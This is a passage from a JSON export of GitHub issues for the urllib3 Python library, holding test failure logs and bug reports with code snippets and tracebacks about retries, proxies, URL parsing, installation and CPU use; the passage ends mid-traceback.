/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/util/retry.py:436>]\r\ntest_cross_protocol_redirect failed (1 runs remaining out of 2).\r\n\t<class 'urllib3.exceptions.MaxRetryError'>\r\n\tHTTPConnectionPool(host='localhost', port=37403): Max retries exceeded with url: http://localhost:44723/redirect?target=https%3A%2F%2Flocalhost%3A45413%2Fecho%3Fa%3Db (Caused by ReadTimeoutError(\"HTTPConnectionPool(host='localhost', port=37403): Read timed out. (read timeout=0.01)\",))\r\n\t[<TracebackEntry /tmp/urllib3/test/with_dummyserver/test_proxy_poolmanager.py:169>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py:76>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py:97>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/poolmanager.py:466>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/poolmanager.py:328>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:760>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:720>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/util/retry.py:436>]\r\ntest_cross_protocol_redirect failed; it passed 0 out of the required 1 times.\r\n\t<class 'urllib3.exceptions.MaxRetryError'>\r\n\tHTTPConnectionPool(host='localhost', port=37403): Max retries exceeded with url: http://localhost:44723/redirect?target=https%3A%2F%2Flocalhost%3A45413%2Fecho%3Fa%3Db (Caused by ReadTimeoutError(\"HTTPConnectionPool(host='localhost', port=37403): Read timed out. (read timeout=0.01)\",))\r\n\t[<TracebackEntry /tmp/urllib3/test/with_dummyserver/test_proxy_poolmanager.py:169>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py:76>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py:97>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/poolmanager.py:466>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/poolmanager.py:328>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:760>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:720>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/util/retry.py:436>]\r\ntest_basic_ipv6_proxy failed (1 runs remaining out of 2).\r\n\t<class 'urllib3.exceptions.MaxRetryError'>\r\n\tHTTPConnectionPool(host='::1', port=35651): Max retries exceeded with url: http://localhost:37661/ (Caused by ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f8cb92392d0>: Failed to establish a new connection: [Errno 111] Connection refused',)))\r\n\t[<TracebackEntry /tmp/urllib3/test/with_dummyserver/test_proxy_poolmanager.py:361>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py:76>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py:97>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/poolmanager.py:466>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/poolmanager.py:328>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:760>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:760>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:760>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:720>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/util/retry.py:436>]\r\ntest_basic_ipv6_proxy failed; it passed 0 out of the required 1 times.\r\n\t<class 'urllib3.exceptions.MaxRetryError'>\r\n\tHTTPConnectionPool(host='::1', port=34131): Max retries exceeded with url: http://localhost:38465/ (Caused by ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f8cb8442c50>: Failed to establish a new connection: [Errno 111] Connection refused',)))\r\n\t[<TracebackEntry /tmp/urllib3/test/with_dummyserver/test_proxy_poolmanager.py:361>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py:76>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py:97>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/poolmanager.py:466>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/poolmanager.py:328>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:760>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:760>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:760>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:720>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/util/retry.py:436>]\r\n\r\n===End Flaky Test Report===\r\n============================================================= short test summary info =============================================================\r\nSKIPPED [2] /tmp/urllib3/test/with_dummyserver/test_https.py:672: Skipping base test class\r\nSKIPPED [2] test/test_util.py:461: only run if brotlipy is absent\r\nSKIPPED [1] test/with_dummyserver/test_socketlevel.py:1579: Header parsing errors not available\r\nSKIPPED [1] /tmp/urllib3/test/__init__.py:90: test_parse_url_bytes_type_error_python_3 requires Python3.x to run\r\nSKIPPED [1] /tmp/urllib3/test/__init__.py:90: test_httplib_headers_case_insensitive requires Python3.x to run\r\nSKIPPED [2] /tmp/urllib3/test/with_dummyserver/test_https.py:656: Skipping base test class\r\nSKIPPED [1] test/with_dummyserver/test_socketlevel.py:1585: Header parsing errors not available\r\nSKIPPED [1] test/with_dummyserver/test_socketlevel.py:1582: Header parsing errors not available\r\nSKIPPED [163] /tmp/urllib3/test/contrib/test_securetransport.py:21: Could not import SecureTransport: ImportError('The library Security could not be found',)\r\nFAILED test/with_dummyserver/test_proxy_poolmanager.py::TestHTTPProxyManager::test_cross_host_redirect - MaxRetryError: HTTPConnectionPool(host=...\r\nFAILED test/with_dummyserver/test_proxy_poolmanager.py::TestHTTPProxyManager::test_cross_protocol_redirect - MaxRetryError: HTTPConnectionPool(h...\r\nFAILED test/with_dummyserver/test_proxy_poolmanager.py::TestIPv6HTTPProxyManager::test_basic_ipv6_proxy - MaxRetryError: HTTPConnectionPool(host...\r\n======================================== 3 failed, 1140 passed, 174 skipped, 31 warnings in 168.61 seconds ========================================\r\nnox > Command coverage run --parallel-mode -m pytest -r a --tb=native --no-success-flaky-report test/ failed with exit code 1\r\nnox > Session test-2.7 failed.\r\n\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1753", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1753/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1753/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1753/events", "html_url": "https://github.com/urllib3/urllib3/issues/1753", "id": 527068738, "node_id": "MDU6SXNzdWU1MjcwNjg3Mzg=", "number": 1753, "title": "urllib3 installation requires setuptools >= 36.2.5", "user": {"login": "Johnlisk", "id": 17524016, "node_id": "MDQ6VXNlcjE3NTI0MDE2", "avatar_url": "https://avatars1.githubusercontent.com/u/17524016?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Johnlisk", "html_url": "https://github.com/Johnlisk", "followers_url": "https://api.github.com/users/Johnlisk/followers", "following_url": "https://api.github.com/users/Johnlisk/following{/other_user}", "gists_url": "https://api.github.com/users/Johnlisk/gists{/gist_id}", "starred_url": "https://api.github.com/users/Johnlisk/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Johnlisk/subscriptions", "organizations_url": "https://api.github.com/users/Johnlisk/orgs", "repos_url": "https://api.github.com/users/Johnlisk/repos", "events_url": "https://api.github.com/users/Johnlisk/events{/privacy}", "received_events_url": "https://api.github.com/users/Johnlisk/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 5, "created_at": "2019-11-22T08:55:23Z", "updated_at": "2019-11-22T13:22:34Z", "closed_at": "2019-11-22T13:22:21Z", "author_association": "NONE", "active_lock_reason": null, "body": "when I install urllib3 by setup.py,I got this:\r\n```\r\n[root@localhost urllib3]# python2 setup.py install\r\n/usr/lib64/python2.7/distutils/dist.py:267: UserWarning: Unknown distribution option: 'project_urls'\r\n  warnings.warn(msg)\r\n/usr/lib64/python2.7/distutils/dist.py:267: UserWarning: Unknown distribution option: 'python_requires'\r\n  warnings.warn(msg)\r\nerror in urllib3 setup command: 'extras_require' must be a dictionary whose values are strings or lists of strings containing valid project/version requirement specifiers.\r\n```\r\nI use python==2.7.5 setuptools==41.6.0\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1746", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1746/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1746/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1746/events", "html_url": "https://github.com/urllib3/urllib3/issues/1746", "id": 521226780, "node_id": "MDU6SXNzdWU1MjEyMjY3ODA=", "number": 1746, "title": "Add `other` counter to Retry for fully fine-grained retry configuration", "user": {"login": "lorien", "id": 35171, "node_id": "MDQ6VXNlcjM1MTcx", "avatar_url": "https://avatars3.githubusercontent.com/u/35171?v=4", "gravatar_id": "", "url": "https://api.github.com/users/lorien", "html_url": "https://github.com/lorien", "followers_url": "https://api.github.com/users/lorien/followers", "following_url": "https://api.github.com/users/lorien/following{/other_user}", "gists_url": "https://api.github.com/users/lorien/gists{/gist_id}", "starred_url": "https://api.github.com/users/lorien/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/lorien/subscriptions", "organizations_url": "https://api.github.com/users/lorien/orgs", "repos_url": "https://api.github.com/users/lorien/repos", "events_url": "https://api.github.com/users/lorien/events{/privacy}", "received_events_url": "https://api.github.com/users/lorien/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 799830518, "node_id": "MDU6TGFiZWw3OTk4MzA1MTg=", "url": "https://api.github.com/repos/urllib3/urllib3/labels/Proposed%20Solution%20Accepted", "name": "Proposed Solution Accepted", "color": "c2e0c6", "default": false, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 6, "created_at": "2019-11-11T22:39:26Z", "updated_at": "2020-04-27T05:32:28Z", "closed_at": "2020-04-27T05:32:27Z", "author_association": "NONE", "active_lock_reason": null, "body": "```python\r\nfrom urllib3 import PoolManager                                                   \r\nfrom urllib3.util.retry import Retry                                              \r\nfrom urllib3.util.timeout import Timeout                                          \r\n                                                                                  \r\n                                                                                  \r\ndef main(**kwargs):                                                               \r\n    url = 'https://78.155.216.172'                                                \r\n    mgr = PoolManager()                                                           \r\n    retry_opts = {                                                                \r\n        'total': None,                                                            \r\n        'redirect': 3,                                                            \r\n        'raise_on_redirect': True,                                                \r\n        'connect': 1,                                                             \r\n        'read': 1,                                                                \r\n    }                                                                             \r\n    res = mgr.request(                                                            \r\n        'GET',                                                                    \r\n        url,                                                                      \r\n        retries=Retry(                                                            \r\n            **retry_opts,                                                         \r\n        ),                                                                        \r\n        timeout=Timeout(                                                          \r\n            connect=3,                                                            \r\n            read=5,                                                               \r\n        ),                                                                        \r\n    )\r\n```\r\nRetry option `connect=1` is ignored. Urllib tries to connect again and again.\r\nConsole output:\r\n```\r\nStarting new HTTPS connection (1): 78.155.216.172:443\r\nIncremented Retry for (url='/'): Retry(total=None, connect=1, read=1, redirect=3, status=None)\r\nRetrying (Retry(total=None, connect=1, read=1, redirect=3, status=None)) after connection broken by 'SSLError(SSLError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:645)'),)': /\r\nStarting new HTTPS connection (2): 78.155.216.172:443\r\nIncremented Retry for (url='/'): Retry(total=None, connect=1, read=1, redirect=3, status=None)\r\nRetrying (Retry(total=None, connect=1, read=1, redirect=3, status=None)) after connection broken by 'SSLError(SSLError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:645)'),)': /\r\nStarting new HTTPS connection (3): 78.155.216.172:443\r\nIncremented Retry for (url='/'): Retry(total=None, connect=1, read=1, redirect=3, status=None)\r\nRetrying (Retry(total=None, connect=1, read=1, redirect=3, status=None)) after connection broken by 'SSLError(SSLError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:645)'),)': /\r\nStarting new HTTPS connection (4): 78.155.216.172:443\r\nIncremented Retry for (url='/'): Retry(total=None, connect=1, read=1, redirect=3, status=None)\r\nRetrying (Retry(total=None, connect=1, read=1, redirect=3, status=None)) after connection broken by 'SSLError(SSLError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:645)'),)': /\r\nStarting new HTTPS connection (5): 78.155.216.172:443\r\nIncremented Retry for (url='/'): Retry(total=None, connect=1, read=1, redirect=3, status=None)\r\nRetrying (Retry(total=None, connect=1, read=1, redirect=3, status=None)) after connection broken by 'SSLError(SSLError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:645)'),)': /\r\nStarting new HTTPS connection (6): 78.155.216.172:443\r\n\r\n... AND SO ON\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1744", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1744/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1744/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1744/events", "html_url": "https://github.com/urllib3/urllib3/issues/1744", "id": 520177045, "node_id": "MDU6SXNzdWU1MjAxNzcwNDU=", "number": 1744, "title": "PoolManager and ProxyManager process retries differently", "user": {"login": "lorien", "id": 35171, "node_id": "MDQ6VXNlcjM1MTcx", "avatar_url": "https://avatars3.githubusercontent.com/u/35171?v=4", "gravatar_id": "", "url": "https://api.github.com/users/lorien", "html_url": "https://github.com/lorien", "followers_url": "https://api.github.com/users/lorien/followers", "following_url": "https://api.github.com/users/lorien/following{/other_user}", "gists_url": "https://api.github.com/users/lorien/gists{/gist_id}", "starred_url": "https://api.github.com/users/lorien/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/lorien/subscriptions", "organizations_url": "https://api.github.com/users/lorien/orgs", "repos_url": "https://api.github.com/users/lorien/repos", "events_url": "https://api.github.com/users/lorien/events{/privacy}", "received_events_url": "https://api.github.com/users/lorien/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 165387, "node_id": "MDU6TGFiZWwxNjUzODc=", "url": "https://api.github.com/repos/urllib3/urllib3/labels/Contributor%20Friendly%20%E2%99%A5", "name": "Contributor Friendly \u2665", "color": "000000", "default": false, "description": null}, {"id": 799830518, "node_id": "MDU6TGFiZWw3OTk4MzA1MTg=", "url": "https://api.github.com/repos/urllib3/urllib3/labels/Proposed%20Solution%20Accepted", "name": "Proposed Solution Accepted", "color": "c2e0c6", "default": false, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 7, "created_at": "2019-11-08T18:49:29Z", "updated_at": "2020-04-03T13:22:01Z", "closed_at": "2020-04-03T13:22:01Z", "author_association": "NONE", "active_lock_reason": null, "body": "Urllib version: 1.25.6\r\n\r\nI want to do zero retries and fail on first error. I use `Retry(total=None, connect=False)` which must fail on first error according to documentaion.\r\n\r\nUsing PoolManager I get NewConnectionError as expected:\r\n```python\r\nfrom urllib3 import PoolManager\r\nfrom urllib3.util.retry import Retry\r\n\r\n\r\nmgr = PoolManager()\r\nmgr.urlopen(\r\n    'GET',\r\n    url='http://localhost:90/',\r\n    retries=Retry(total=None, connect=False),\r\n)\r\n```\r\nError:\r\n```\r\nTraceback (most recent call last):\r\n  File \"/tmp/z5/lib/python3.5/site-packages/urllib3/connection.py\", line 157, in _new_conn\r\n    (self._dns_host, self.port), self.timeout, **extra_kw\r\n  File \"/tmp/z5/lib/python3.5/site-packages/urllib3/util/connection.py\", line 84, in create_connection\r\n    raise err\r\n  File \"/tmp/z5/lib/python3.5/site-packages/urllib3/util/connection.py\", line 74, in create_connection\r\n    sock.connect(sa)\r\nConnectionRefusedError: [Errno 111] Connection refused\r\n\r\nDuring handling of the above exception, another exception occurred:\r\n\r\nTraceback (most recent call last):\r\n  File \"test.py\", line 9, in <module>\r\n    retries=Retry(total=None, connect=False),\r\n  File \"/tmp/z5/lib/python3.5/site-packages/urllib3/poolmanager.py\", line 330, in urlopen\r\n    response = conn.urlopen(method, u.request_uri, **kw)\r\n  File \"/tmp/z5/lib/python3.5/site-packages/urllib3/connectionpool.py\", line 720, in urlopen\r\n    method, url, error=e, _pool=self, _stacktrace=sys.exc_info()[2]\r\n  File \"/tmp/z5/lib/python3.5/site-packages/urllib3/util/retry.py\", line 393, in increment\r\n    raise six.reraise(type(error), error, _stacktrace)\r\n  File \"/tmp/z5/lib/python3.5/site-packages/urllib3/packages/six.py\", line 735, in reraise\r\n    raise value\r\n  File \"/tmp/z5/lib/python3.5/site-packages/urllib3/connectionpool.py\", line 672, in urlopen\r\n    chunked=chunked,\r\n  File \"/tmp/z5/lib/python3.5/site-packages/urllib3/connectionpool.py\", line 387, in _make_request\r\n    conn.request(method, url, **httplib_request_kw)\r\n  File \"/usr/lib/python3.5/http/client.py\", line 1107, in request\r\n    self._send_request(method, url, body, headers)\r\n  File \"/usr/lib/python3.5/http/client.py\", line 1152, in _send_request\r\n    self.endheaders(body)\r\n  File \"/usr/lib/python3.5/http/client.py\", line 1103, in endheaders\r\n    self._send_output(message_body)\r\n  File \"/usr/lib/python3.5/http/client.py\", line 934, in _send_output\r\n    self.send(msg)\r\n  File \"/usr/lib/python3.5/http/client.py\", line 877, in send\r\n    self.connect()\r\n  File \"/tmp/z5/lib/python3.5/site-packages/urllib3/connection.py\", line 184, in connect\r\n    conn = self._new_conn()\r\n  File \"/tmp/z5/lib/python3.5/site-packages/urllib3/connection.py\", line 169, in _new_conn\r\n    self, \"Failed to establish a new connection: %s\" % e\r\nurllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPConnection object at 0x7f41c4e512e8>: Failed to establish a new connection: [Errno 111] Connection refused\r\n```\r\n\r\nUsing ProxyManager I get recursion error:\r\n```python\r\nfrom urllib3 import ProxyManager\r\nfrom urllib3.util.retry import Retry\r\n\r\nmgr = ProxyManager('http://localhost:91')\r\nmgr.urlopen(\r\n    'HEAD',\r\n    url='http://localhost:90/',\r\n    retries=Retry(total=None, connect=False),\r\n)\r\n```\r\n\r\nError:\r\n```\r\nTraceback (most recent call last):\r\n  File \"test.py\", line 20, in <module>\r\n    retries=Retry(total=None, connect=False),\r\n  File \"/tmp/z5/lib/python3.5/site-packages/urllib3/poolmanager.py\", line 466, in urlopen\r\n    return super(ProxyManager, self).urlopen(method, url, redirect=redirect, **kw)\r\n  File \"/tmp/z5/lib/python3.5/site-packages/urllib3/poolmanager.py\", line 328, in urlopen\r\n    response = conn.urlopen(method, url, **kw)\r\n\r\n.......... LOT OF SAME LINES ...........\r\n\r\n  File \"/tmp/z5/lib/python3.5/site-packages/urllib3/connectionpool.py\", line 762, in urlopen\r\n    **response_kw\r\n  File \"/tmp/z5/lib/python3.5/site-packages/urllib3/connectionpool.py\", line 762, in urlopen\r\n    **response_kw\r\n  File \"/tmp/z5/lib/python3.5/site-packages/urllib3/connectionpool.py\", line 762, in urlopen\r\n    **response_kw\r\n  File \"/tmp/z5/lib/python3.5/site-packages/urllib3/connectionpool.py\", line 762, in urlopen\r\n    **response_kw\r\n  File \"/tmp/z5/lib/python3.5/site-packages/urllib3/connectionpool.py\", line 672, in urlopen\r\n    chunked=chunked,\r\n  File \"/tmp/z5/lib/python3.5/site-packages/urllib3/connectionpool.py\", line 387, in _make_request\r\n    conn.request(method, url, **httplib_request_kw)\r\n  File \"/usr/lib/python3.5/http/client.py\", line 1107, in request\r\n    self._send_request(method, url, body, headers)\r\n  File \"/usr/lib/python3.5/http/client.py\", line 1152, in _send_request\r\n    self.endheaders(body)\r\n  File \"/usr/lib/python3.5/http/client.py\", line 1103, in endheaders\r\n    self._send_output(message_body)\r\n  File \"/usr/lib/python3.5/http/client.py\", line 934, in _send_output\r\n    self.send(msg)\r\n  File \"/usr/lib/python3.5/http/client.py\", line 877, in send\r\n    self.connect()\r\n  File \"/tmp/z5/lib/python3.5/site-packages/urllib3/connection.py\", line 184, in connect\r\n    conn = self._new_conn()\r\n  File \"/tmp/z5/lib/python3.5/site-packages/urllib3/connection.py\", line 157, in _new_conn\r\n    (self._dns_host, self.port), self.timeout, **extra_kw\r\n  File \"/tmp/z5/lib/python3.5/site-packages/urllib3/util/connection.py\", line 61, in create_connection\r\n    for res in socket.getaddrinfo(host, port, family, socket.SOCK_STREAM):\r\n  File \"/usr/lib/python3.5/socket.py\", line 735, in getaddrinfo\r\n    addrlist.append((_intenum_converter(af, AddressFamily),\r\n  File \"/usr/lib/python3.5/socket.py\", line 93, in _intenum_converter\r\n    return enum_klass(value)\r\n  File \"/usr/lib/python3.5/enum.py\", line 241, in __call__\r\n    return cls.__new__(cls, value)\r\n  File \"/usr/lib/python3.5/enum.py\", line 463, in __new__\r\n    if type(value) is cls:\r\nRecursionError: maximum recursion depth exceeded while calling a Python object\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1738", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1738/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1738/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1738/events", "html_url": "https://github.com/urllib3/urllib3/issues/1738", "id": 518964802, "node_id": "MDU6SXNzdWU1MTg5NjQ4MDI=", "number": 1738, "title": "Fails to load URL which ends with \"?\"", "user": {"login": "lorien", "id": 35171, "node_id": "MDQ6VXNlcjM1MTcx", "avatar_url": "https://avatars3.githubusercontent.com/u/35171?v=4", "gravatar_id": "", "url": "https://api.github.com/users/lorien", "html_url": "https://github.com/lorien", "followers_url": "https://api.github.com/users/lorien/followers", "following_url": "https://api.github.com/users/lorien/following{/other_user}", "gists_url": "https://api.github.com/users/lorien/gists{/gist_id}", "starred_url": "https://api.github.com/users/lorien/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/lorien/subscriptions", "organizations_url": "https://api.github.com/users/lorien/orgs", "repos_url": "https://api.github.com/users/lorien/repos", "events_url": "https://api.github.com/users/lorien/events{/privacy}", "received_events_url": "https://api.github.com/users/lorien/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-11-07T00:16:47Z", "updated_at": "2019-11-07T00:52:33Z", "closed_at": "2019-11-07T00:52:33Z", "author_association": "NONE", "active_lock_reason": null, "body": "Urllib3 version is 1.25.6\r\n\r\nCode\r\n```python\r\nfrom urllib3 import PoolManager\r\n\r\ndef main():\r\n    mgr = PoolManager()\r\n    res = mgr.request('GET', 'http://yandex.ru/?')\r\n    print(res.status)\r\n\r\nif __name__ == '__main__':\r\n    main()\r\n```\r\n\r\nFails with traceback:\r\n```\r\nTraceback (most recent call last):\r\n  File \"test.py\", line 11, in <module>\r\n    main()\r\n  File \"test.py\", line 6, in main\r\n    res = mgr.request('GET', 'http://yandex.ru/?')\r\n  File \"/usr/local/lib/python3.5/dist-packages/urllib3/request.py\", line 76, in request\r\n    method, url, fields=fields, headers=headers, **urlopen_kw\r\n  File \"/usr/local/lib/python3.5/dist-packages/urllib3/request.py\", line 97, in request_encode_url\r\n    return self.urlopen(method, url, **extra_kw)\r\n  File \"/usr/local/lib/python3.5/dist-packages/urllib3/poolmanager.py\", line 330, in urlopen\r\n    response = conn.urlopen(method, u.request_uri, **kw)\r\n  File \"/usr/local/lib/python3.5/dist-packages/urllib3/connectionpool.py\", line 615, in urlopen\r\n    url = six.ensure_str(_encode_target(url))\r\n  File \"/usr/local/lib/python3.5/dist-packages/urllib3/util/url.py\", line 328, in _encode_target\r\n    path, query, fragment = TARGET_RE.match(target).groups()\r\nAttributeError: 'NoneType' object has no attribute 'groups'\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1737", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1737/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1737/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1737/events", "html_url": "https://github.com/urllib3/urllib3/issues/1737", "id": 518622713, "node_id": "MDU6SXNzdWU1MTg2MjI3MTM=", "number": 1737, "title": "1.25.* uses more CPU than 1.24.*", "user": {"login": "lorien", "id": 35171, "node_id": "MDQ6VXNlcjM1MTcx", "avatar_url": "https://avatars3.githubusercontent.com/u/35171?v=4", "gravatar_id": "", "url": "https://api.github.com/users/lorien", "html_url": "https://github.com/lorien", "followers_url": "https://api.github.com/users/lorien/followers", "following_url": "https://api.github.com/users/lorien/following{/other_user}", "gists_url": "https://api.github.com/users/lorien/gists{/gist_id}", "starred_url": "https://api.github.com/users/lorien/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/lorien/subscriptions", "organizations_url": "https://api.github.com/users/lorien/orgs", "repos_url": "https://api.github.com/users/lorien/repos", "events_url": "https://api.github.com/users/lorien/events{/privacy}", "received_events_url": "https://api.github.com/users/lorien/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 6, "created_at": "2019-11-06T17:32:44Z", "updated_at": "2019-12-08T04:50:05Z", "closed_at": "2019-12-08T04:50:05Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hey guys,\r\n\r\nI am developing web scraping framework and I use gevent and urllib3.\r\nToday I've upgraded from 1.24.1 to 1.25.6 and found that my scraper started eating 100% CPU.\r\nBefore upgrade it was eating about 30-40% CPU.\r\n\r\nI've tried different versions of urllib3 and it turned out:\r\n * 1.24.1 and 1.24.2 eats 30-40% CPU\r\n * 1.25 and higher eats 100% CPU\r\n\r\nI've decided to start this issue and maybe get some feedback from other users. I'll try to provide more technical details later, like profiling statistics.\r\n\r\nSo, my question is is anybody else concern with performance of 1.25+ version?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1731", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1731/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1731/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1731/events", "html_url": "https://github.com/urllib3/urllib3/issues/1731", "id": 516863740, "node_id": "MDU6SXNzdWU1MTY4NjM3NDA=", "number": 1731, "title": "AttributeError: 'NoneType' object has no attribute 'groups' on simple PoolManager.request", "user": {"login": "MansM", "id": 14215294, "node_id": "MDQ6VXNlcjE0MjE1Mjk0", "avatar_url": "https://avatars2.githubusercontent.com/u/14215294?v=4", "gravatar_id": "", "url": "https://api.github.com/users/MansM", "html_url": "https://github.com/MansM", "followers_url": "https://api.github.com/users/MansM/followers", "following_url": "https://api.github.com/users/MansM/following{/other_user}", "gists_url": "https://api.github.com/users/MansM/gists{/gist_id}", "starred_url": "https://api.github.com/users/MansM/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/MansM/subscriptions", "organizations_url": "https://api.github.com/users/MansM/orgs", "repos_url": "https://api.github.com/users/MansM/repos", "events_url": "https://api.github.com/users/MansM/events{/privacy}", "received_events_url": "https://api.github.com/users/MansM/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2019-11-03T17:45:18Z", "updated_at": "2019-11-04T16:34:42Z", "closed_at": "2019-11-04T16:34:42Z", "author_association": "NONE", "active_lock_reason": null, "body": "```\r\nhttp = urllib3.PoolManager(maxsize=10)\r\n\r\nurl = \"http://someaddress:32400/library/sections?\"\r\ntoken = \"NotSharingIsSometimesCaring\"\r\nget = http.request(method='GET', url=url, headers={'X-Plex-Token': token})\r\n```\r\n\r\nTried macos Mojave with Py 3.7.4 and in docker with python 3.8 \r\nusing urllib3  1.25.6\r\n\r\n```\r\n$ python3 test.py\r\nTraceback (most recent call last):\r\n  File \"test.py\", line 9, in <module>\r\n    get = http.request(method='GET', url=url, headers={'X-Plex-Token': token})\r\n  File \"/Users/someusername/Library/Python/3.7/lib/python/site-packages/urllib3/request.py\", line 76, in 